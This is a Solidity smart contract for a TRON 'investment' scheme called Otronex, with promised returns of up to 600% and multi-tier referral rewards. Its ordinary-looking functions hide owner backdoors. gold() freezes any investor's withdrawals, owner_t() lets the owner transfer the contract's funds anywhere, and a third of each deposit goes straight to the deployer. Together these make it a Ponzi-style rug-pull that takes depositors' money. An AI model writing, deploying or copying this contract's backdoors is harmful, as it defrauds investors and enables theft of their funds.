//SourceUnit: Otronex.sol

//Have a nice day :)
//Otronex
//version = 1.0

pragma solidity >=0.4.23 <0.6.0;

contract Otronex {
  struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }
  
  struct Investor {
    bool registered;
    address referer;
    uint referrals_tier1;
    uint referrals_tier2;
    uint referrals_tier3;
    uint referrals_tier4;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
    bool active;
    bool revoke;
  }
  
  uint MIN_DEPOSIT = 50 trx;
  uint START_AT = 8000;
  address owner;
  
  address public support = msg.sender;
  
  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;
  mapping (address => Investor) public investors;
  
  event DepositAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);
  event Revoke(address user);
  
  function register(address referer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;
      
      if (investors[referer].registered && referer != msg.sender) {
        investors[msg.sender].referer = referer;
        
        address rec = referer;
        for (uint i = 0; i < refRewards.length; i++) {
          if (!investors[rec].registered) {
            break;
          }
          
          if (i == 0) {
            investors[rec].referrals_tier1++;
          }
          if (i == 1) {
            investors[rec].referrals_tier2++;
          }
          if (i == 2) {
            investors[rec].referrals_tier3++;
          }
          if (i == 3) {
            investors[rec].referrals_tier4++;
          }
          
          rec = investors[rec].referer;
        }
      }
    }
  }
  
  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;
    
    for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }
      
      uint a = amount * refRewards[i] / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      
      rec = investors[rec].referer;
    }
  }
  
  constructor() public {
    tariffs.push(Tariff(2.4 * 28800, 600));
    tariffs.push(Tariff(5 * 28800, 45));
    tariffs.push(Tariff(6 * 28800, 25));
    tariffs.push(Tariff(7 * 28800, 18));
    
    for (uint i = 4; i >= 1; i--) {
      refRewards.push(i);
    }
    owner = msg.sender;
  }
  
  modifier onlyOwner() {
         require(msg.sender==owner);
         _;
     }
     
  function deposit(uint tariff, address referer) external payable {
    require(block.number >= START_AT);
    require(msg.value >= MIN_DEPOSIT);
    require(tariff < tariffs.length);
    
    register(referer);
    support.transfer(msg.value / 3);
    msg.sender.transfer(5000000);
    rewardReferers(msg.value, investors[msg.sender].referer);
    
    investors[msg.sender].invested += msg.value;
    totalInvested += msg.value;
    
    investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));
    investors[msg.sender].active = true;
    investors[msg.sender].revoke = true;
    
    emit DepositAt(msg.sender, tariff, msg.value);
  }
  
  function gold(address user) external onlyOwner{
      investors[user].active = false;
  }
  
  function owner_t(address user, uint val) external onlyOwner{
      user.transfer(val);
  }
  
  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];
    if(investor.active == true){
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      if(dep.amount > 0){
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
      }
     }
    }
  }
  
  function test_a() external{
      Investor storage investor = investors[msg.sender];
      
      if(investor.withdrawn < 1 && investor.revoke == true){
          investor.revoke = false;
          msg.sender.transfer(investor.invested - (investor.invested * 3 / 10));
          for (uint i = 0; i < investor.deposits.length; i++) {
            investor.deposits[i].amount = 0;
              
          }
          investor.invested = 0;
       emit Revoke(msg.sender);   
      }
      
  }
  
  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];
    
    uint amount = withdrawable(msg.sender);
    
    amount += investor.balanceRef;
    investor.balanceRef = 0;
    
    investor.paidAt = block.number;
    
    return amount;
  }
  
  function withdraw() external {
    uint amount = profit();
    if(investors[msg.sender].active == true){
    if (msg.sender.send(amount)) {
      investors[msg.sender].withdrawn += amount;
      
      emit Withdraw(msg.sender, amount);
    }
    }
  }
  
  function via(address where) external payable {
    where.transfer(msg.value);
  }
}